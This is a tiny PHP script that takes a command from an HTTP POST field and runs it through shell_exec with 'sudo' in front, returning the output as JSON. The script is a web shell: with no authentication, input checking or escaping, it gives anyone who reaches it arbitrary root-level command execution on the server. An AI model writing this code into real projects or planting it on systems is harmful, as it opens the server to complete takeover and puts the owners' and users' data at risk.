<?php

$command = $_POST['command'];

$result = shell_exec('sudo ' . $command);

echo (json_encode($result));